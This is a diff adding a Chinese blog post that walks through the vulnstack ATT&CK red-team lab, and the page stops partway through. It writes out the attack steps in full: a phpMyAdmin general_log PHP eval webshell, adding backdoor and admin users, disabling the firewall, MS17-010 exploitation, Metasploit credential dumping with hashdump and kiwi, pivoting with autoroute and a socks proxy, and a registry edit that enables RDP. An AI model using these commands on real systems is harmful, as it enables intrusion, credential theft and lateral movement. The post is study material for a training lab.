@@ -1,0 +1,524 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.2.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.19.2","exturl":false,"sidebar":{"position":"right","width":200,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+
+
+<link rel="canonical" href="http://example.com/2023/12/25/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2023/12/25/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/","path":"2023/12/25/ATT&CK红队评估实战靶场（一）/","title":"ATT&CK红队评估实战靶场（一）"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>ATT&CK红队评估实战靶场（一） | Y0ng's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Y0ng's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2%E7%9A%84%E8%AF%9D"><span class="nav-text">写在前面的话</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA"><span class="nav-text">靶场搭建</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-text">信息搜集</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8getshell"><span class="nav-text">漏洞利用getshell</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%8E%E5%8F%B0Getshell"><span class="nav-text">后台Getshell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%9A%81%E5%89%91%E5%88%A9%E7%94%A8"><span class="nav-text">蚁剑利用</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8E%A7%E5%88%B6win7"><span class="nav-text">控制win7</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%9D%83%E9%99%90"><span class="nav-text">获取权限</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90"><span class="nav-text">提升权限</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E5%AF%86%E7%A0%81%E6%94%B6%E9%9B%86"><span class="nav-text">主机密码收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5"><span class="nav-text">远程桌面连接</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E6%90%9C%E9%9B%86"><span class="nav-text">内网搜集</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1%EF%BC%8C%E6%8C%82socks4a%E4%BB%A3%E7%90%86"><span class="nav-text">添加路由，挂socks4a代理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1"><span class="nav-text">添加路由</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8C%82socks4a%E4%BB%A3%E7%90%86"><span class="nav-text">挂socks4a代理</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B8%97%E9%80%8Fwin2003-%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95"><span class="nav-text">渗透win2003(远程登录)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%9D%E8%AF%95%E6%94%BB%E5%87%BB"><span class="nav-text">尝试攻击</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B5%B0%E5%90%91win2008-C%E7%9B%98%E5%85%B1%E4%BA%AB%E4%BC%A0%E9%A9%AC"><span class="nav-text">走向win2008(C盘共享传马)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1"><span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%A6%E8%BE%9F%E8%B9%8A%E5%BE%84"><span class="nav-text">另辟蹊径</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-text">参考</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Y0ng</p>
+  <div class="site-description" itemprop="description">花有重开日，人无再少年</div>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/12/25/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Y0ng">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Y0ng's Blog">
+      <meta itemprop="description" content="花有重开日，人无再少年">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="ATT&CK红队评估实战靶场（一） | Y0ng's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ATT&CK红队评估实战靶场（一）
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-12-25 00:41:11" itemprop="dateCreated datePublished" datetime="2023-12-25T00:41:11+08:00">2023-12-25</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">渗透</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="写在前面的话"><a href="#写在前面的话" class="headerlink" title="写在前面的话"></a>写在前面的话</h1><p>第一次尝试这种渗透靶场，还是在考试的三天中完成的，会接着进行其他的靶场(真是又菜又爱玩)</p>
+<p>靶场地址：<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/">vulunstack</a></p>
+<h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322185215569.png"></p>
+<a id="more"></a>
+<hr>
+<blockquote>
+<p>Win7：密码: cys121`<br>外网192.168.47.132<br>内网 192.168.52.143</p>
+</blockquote>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322185305616.png"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322185311742.png"></p>
+<hr>
+<blockquote>
+<p>Win2008 密码：cys121`<br>内网 192.168.52.138</p>
+</blockquote>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322185332943.png"></p>
+<hr>
+<blockquote>
+<p>Win2003 密码:cys121`<br>内网 192.168.52.141</p>
+</blockquote>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322185412788.png"></p>
+<p>经过互相ping 内网三台机器可以互相ping通</p>
+<hr>
+<blockquote>
+<p>Kali<br>外网 192.168.47.129</p>
+</blockquote>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322185445893.png"></p>
+<hr>
+<blockquote>
+<p>Kali(攻击机)：外网 192.168.47.129<br>Win7(VM1)：外网192.168.47.132  内网 192.168.52.143<br>Win2003(VM2) 域成员 192.168.52.141<br>Win2008(VM3) 域控 192.168.52.138</p>
+</blockquote>
+<p>启动win7 phpstudy：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322185650430.png"></p>
+<hr>
+<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>访问win7 php网站服务：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322185733544.png"><br>看到是php探针</p>
+<p><code>Nmap</code> 扫描开启了哪些端口：开启80端口</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322185938891.png"><br><code>御剑</code>扫描：发现phpmyadmin</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322185955574.png"></p>
+<p><code>dirsearch</code> 也扫到一些</p>
+<p>这里我没有扫到/yxcms/</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322190243730.png"><br>这里可以利用网页的漏洞登录进后台进行文件编辑写入一句话getshell，这里就不说了</p>
+<hr>
+<h1 id="漏洞利用getshell"><a href="#漏洞利用getshell" class="headerlink" title="漏洞利用getshell"></a>漏洞利用getshell</h1><h2 id="后台Getshell"><a href="#后台Getshell" class="headerlink" title="后台Getshell"></a>后台Getshell</h2><p>进入/phpmyadmin</p>
+<p>默认账号密码登陆成功：root root</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322190456182.png"><br>尝试一下用 <code>into outfile</code>执行写入一句话getshell失败：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select &quot;&lt;?php eval($_POST[shell]);?&gt;&quot; into out file &#39;&#x2F;tmp&#x2F;cyshack.php&#39;</span><br></pre></td></tr></table></figure>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322190609953.png"><br>原因是写入功能未开启</p>
+<p>尝试<code>开启全局日志</code>利用getshell   </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show variables like &#39;%general%&#39;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322190657237.png"></p>
+<p>可以看到功能是关闭的且回显日志文件的路径</p>
+<p>尝试开启并更改路径</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set global general_log&#x3D;&#39;on&#39;</span><br><span class="line">set global general_log_file&#x3D;&#39;C:&#x2F;phpStudy&#x2F;www&#x2F;cyshack.php&#39; </span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322190714875.png"><br><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322190941139.png"><br>写入一句话：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select &quot;&lt;?php eval($_POST[shell]);?&gt;&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322191019424.png"><br>蚁剑链接：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322191040921.png"><br>成功getshell：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322191108148.png"></p>
+<hr>
+<h2 id="蚁剑利用"><a href="#蚁剑利用" class="headerlink" title="蚁剑利用"></a>蚁剑利用</h2><p>蚁剑查询身份：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322191208119.png"></p>
+<hr>
+<p>添加用户：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> net user cys hongrisec@2020 &#x2F;add</span><br><span class="line"></span><br><span class="line">(增加一个名为cys 密码为hongrisec@2020的用户名）</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322191311967.png"><br>查看cys用户:</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2021032219132539.png"></p>
+<hr>
+<p>关闭防火墙：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322191602454.png"></p>
+<hr>
+<h1 id="控制win7"><a href="#控制win7" class="headerlink" title="控制win7"></a>控制win7</h1><h2 id="获取权限"><a href="#获取权限" class="headerlink" title="获取权限"></a>获取权限</h2><p>有两种方法：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">木马反弹shell</span><br><span class="line">SMB ms17_010</span><br></pre></td></tr></table></figure>
+
+<p>Msvemon生成木马</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322192501798.png"><br>蚁剑上传木马</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322192513123.png"><br>运行木马：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322192527743.png"><br>在kali设置监听即可</p>
+<p>尝试ms17_010：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322192617703.png"><br>攻击 拿下win7权限：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2021032219263189.png"></p>
+<hr>
+<h2 id="提升权限"><a href="#提升权限" class="headerlink" title="提升权限"></a>提升权限</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Sysinfo</span><br><span class="line">Getuid  (发现是administor权限)</span><br><span class="line">Getsystem (获取system权限)</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41874930/article/details/110001596">msf的getsystem命令原理</a></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322192943835.png"></p>
+<hr>
+<h2 id="主机密码收集"><a href="#主机密码收集" class="headerlink" title="主机密码收集"></a>主机密码收集</h2><p><code>Hashdump</code>：看到用户的密码哈希值</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322193048868.png"></p>
+<p>Mimikatz：抓取明文密码<br>ps：mimikatz模块已经合并为<code>kiwi</code>模块</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38626043/article/details/109388147">Metasploit-进阶用户密码与mimikatz模块kiwi模块</a></p>
+<p><code>load_kiwi</code>:</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2021032219315449.png"><br><code>creds_all</code> 命令直接获取密码：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322193233525.png"></p>
+<hr>
+<h2 id="远程桌面连接"><a href="#远程桌面连接" class="headerlink" title="远程桌面连接"></a>远程桌面连接</h2><p>Nmap未开启3389</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2021032219364197.png"><br>meterpreter尝试开启3389：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322193741976.png"><br>尝试远程登录：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rdesktop -g 1440x900 -r disk:LinuxxDisk&#x3D;&#x2F;root&#x2F;Downloads -u STU1 -p &quot;密码&quot; 192.168.47.132</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322193814844.png"></p>
+<hr>
+<h1 id="内网搜集"><a href="#内网搜集" class="headerlink" title="内网搜集"></a>内网搜集</h1><p>ipconfig看到另外一个ip：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2021032219421943.png"><br>应该是内网网段</p>
+<p>使用 <code>ipconfig /all</code> 查看 DNS 服务器：<br>发现 DNS 服务器名为 god.org</p>
+<p>查看域信息：net view</p>
+<p>查看主域信息：net view /domain</p>
+<p>网上很多搜集手段，不在说了</p>
+<hr>
+<h1 id="添加路由，挂socks4a代理"><a href="#添加路由，挂socks4a代理" class="headerlink" title="添加路由，挂socks4a代理"></a>添加路由，挂socks4a代理</h1><p>横向渗透前，先将该web服务器配置为代理服务器当作跳板机。</p>
+<h2 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h2><p>查看路由信息，添加路由到目标环境网络</p>
+<p><code>目的是</code>为了使得MSF能够通过Win7路由转发访问,使得msf命令能够通过win7 访问到 内网</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Run get_local_subnets   &#x2F;&#x2F;可以用此命令查看目标机器所在内网网端信息与公网网端信息。</span><br></pre></td></tr></table></figure>
+<p><code>添加内网路由</code> 使得msf6能通过win7路由转发访问内网192.168.52.0/24网段</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run autoroute -s 192.168.52.0&#x2F;24</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322194502617.png"></p>
+<p>这样，我们就可以通过msf 进入.52网段</p>
+<p>马上扫描52网段：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;arp_scanner RHOSTS&#x3D;192.168.52.0&#x2F;24</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322194849103.png"></p>
+<p>扫描存活主机：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;netbios&#x2F;nbname</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2021032219530666.png"></p>
+<p>内网端口信息：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2021032219533417.png"></p>
+<hr>
+<h2 id="挂socks4a代理"><a href="#挂socks4a代理" class="headerlink" title="挂socks4a代理"></a>挂socks4a代理</h2><p>挂代理是为了让<code>其他工具</code>能够通过win7 ，去访问192.168.52.0/24 网段</p>
+<p>配置msf代理：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use auxiliary&#x2F;server&#x2F;socks_proxy</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322200034597.png"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322200044762.png"><br>run之后会<code>出现 starting...</code> ，<code>jobs</code>可以查看当前代理任务，如果<code>出现stoping...</code>，可以尝试更改 <code>SRVHOST</code>配置 或者 修改如下配置文件</p>
+<p>如果proxychains配置终端代理出现问题 修改一下文件</p>
+<p>切记打开的是<code>/etc/proxychains4.config</code></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322200354840.png"></p>
+<p>设置代理成功后 使用其他工具时需要添加<code>proxychains:</code></p>
+<p>Nmap扫描 192.168.52.141</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxychains nmap -Pn -sT 192.168.52.141  &#x2F;&#x2F; -Pn -sT 不可少</span><br></pre></td></tr></table></figure>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322200440271.png"></p>
+<hr>
+<h1 id="渗透win2003-远程登录"><a href="#渗透win2003-远程登录" class="headerlink" title="渗透win2003(远程登录)"></a>渗透win2003(远程登录)</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>扫描主机版本</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_version </span><br></pre></td></tr></table></figure>
+
+<p> 扫描192.168.52.141系统版本信息 是win2003</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2021032220082548.png"><br>nmap 扫描端口等</p>
+<hr>
+<h2 id="尝试攻击"><a href="#尝试攻击" class="headerlink" title="尝试攻击"></a>尝试攻击</h2><p>由nmap看到开放445端口<br>尝试永恒之蓝攻击win2003</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_psexec   &#x2F;&#x2F;windows 2003 的攻击模块</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set payload windows&#x2F;meterpreter&#x2F;bind_tcp</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322201157979.png"><br>可以看到能获取权限但是win7直接断开连接</p>
+<p>再次尝试：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322201227714.png"><br>依旧是：（经常性断掉win7 控制权，导致断一次我就要重新打一次）</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322201238148.png"><br>我去！！！终于知道哪里错了</p>
+<p>得到win7权限之后 一定要首先看一下自己的权限</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Getuid</span><br><span class="line">Getsystem</span><br><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp(关闭防火墙)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//202103222013504.png"></p>
+<p>再打一次：成了但是其他命令无法执行</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322201402952.png"><br>尝试<code>ms08-067</code>没打下来</p>
+<p>可以<code>执行一些系统权限的命令</code>，添加管理员用户尝试3389登录</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use auxiliary&#x2F;admin&#x2F;smb&#x2F;ms17_010_command </span><br></pre></td></tr></table></figure>
+
+<p>因为开了445端口：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use auxiliary&#x2F;admin&#x2F;smb&#x2F;ms17_010_command</span><br><span class="line">show options</span><br><span class="line">set rhosts 192.168.52.141</span><br><span class="line">set command net user cyshack @cys121@ &#x2F;add  #添加用户</span><br><span class="line">run  #成功执行</span><br><span class="line">set command net localgroup administrators cyshack &#x2F;add  #管理员权限</span><br><span class="line">run  #成功执行</span><br><span class="line">set command &#39;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f&#39;  &#x2F;&#x2F;开启3389端口</span><br><span class="line">run #成功执行</span><br></pre></td></tr></table></figure>
+
+<p>系统权限命令：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322202013158.png"></p>
+<p>cyshack用户：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210322202107255.png"></p>
+<p>3389：</p>
